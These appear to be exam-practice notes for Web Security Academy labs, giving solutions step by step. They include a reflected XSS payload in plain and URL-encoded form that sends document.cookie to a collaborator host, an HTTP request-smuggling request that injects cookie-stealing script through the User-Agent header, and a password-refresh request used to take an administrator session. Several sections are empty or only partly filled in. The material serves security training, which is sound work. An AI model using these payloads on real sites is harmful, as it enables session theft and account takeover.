# Extra 12  

## 1 - 1  
  
>Identify reflected XSS in search `tracker.gif`   

```
</ScRiPt ><img src=a onerror=document.location="https://COLLABORATOR.com/?biscuit="+document.cookie>
```  

>URL encode all b4 adding as searchterm value

```
%3c%2f%53%63%52%69%50%74%20%3e%3c%69%6d%67%20%73%72%63%3d%61%20%6f%6e%65%72%72%6f%72%3d%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%78%79%7a%62%72%6a%72%78%31%34%65%31%69%68%64%6e%75%34%6f%68%6f%7a%6f%61%66%31%6c%73%39%69%78%37%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%3f%62%69%73%63%3d%22%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3e
```

>exploit body

```
<script>
location = "https://0a93007e04e29b2ac06b2cf100ad00fe.web-security-academy.net/?term=%3c%2f%53%63%52%69%50%74%20%3e%3c%69%6d%67%20%73%72%63%3d%61%20%6f%6e%65%72%72%6f%72%3d%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%22%68%74%74%70%73%3a%2f%2f%78%79%7a%62%72%6a%72%78%31%34%65%31%69%68%64%6e%75%34%6f%68%6f%7a%6f%61%66%31%6c%73%39%69%78%37%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2f%3f%62%69%73%63%3d%22%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3e"
</script>
```  

## 1 - 2  

>adv search filters - sqlmap  

```
sqlmap -u 

```  
  

>change email + set pass  

```
attacker@exploit-1234.exploit-server.net

```

## 1 - 3  

>admin file image path + size parameters ????

```

```  

## 2 - 1  

>identify `User-Agent` in blog post comment load `/post?postId=10`  

>http smuggle request  

```
POST / HTTP/1.1
Host: TARGET.net
Cookie: _lab=YESYESYESYES; _lab_analytics=YESYESYESYES; session=YESYESYESYES
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Transfer-Encoding: Ceop4Tck
Content-Length: 795
Connection: keep-alive

1a
mug9q=x&find=fuzz2&8p7m4=x
0

GET /post?postId=10 HTTP/1.1
User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?app='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Cookie: _lab=YESYESYESYES; _lab_analytics=YESYESYESYES; session=YESYESYESYES

x=1
```  

>send multiple times  

>replace cookie, set email, change password for user

>COLLABORATOR received  

```
GET /?APP=session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--blah%blah%2f%blah%2b%blah%blah%3d%3d HTTP/1.1
Host: COLLABORATOR.oastify.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.64 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

## 2 - 2  

>Identify password change refresh csrf ???  

1. intercept `POST /refreshpassword HTTP/2`  
2. Change `username` to `administrator`  
3. Copy `csrf` from current logged in user profile accounts source code hidden value.  
4. Send pass change request, copy from response the `set-cookie` for administrator.  
5. replace cookie in current session to privesc.  

[csrf privesc](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/csrf-privesc.png)  

```
POST /refreshpassword HTTP/2
Host: TARGET.net
Cookie:session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--BLAHBLAHBLAH%3d;
Content-Length: 60
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Forwarded-Host: exploit-1234.exploit-server.net
X-Host: exploit-1234.exploit-server.net
X-Forwarded-Server: exploit-1234.exploit-server.net
Referer: https://TARGET.net/refreshpassword
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

csrf=CurrentUserCookieValueX&username=administrator
```  

>response 200 ok set-cookie value  

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=%7b%22username%22%3a%22administrator%22%2c%22isloggedin%22%3atrue%7d--BLAHBLAHI%2bq3penAl0%blah%3d%3d; Secure; SameSite=None

X-Frame-Options: SAMEORIGIN
Content-Length: 3441

<!DOCTYPE html>
```  

>copy stolen cookie to session, update email, change password administrator  


## 2 - 3  

>admin function download report pdf `/adminpanel/save-metrics` in POST body JSON field `PageHtml`  

>SSRF vulnerability, you can use it to read the files by accessing an internal-only service running on locahost on port 6566.

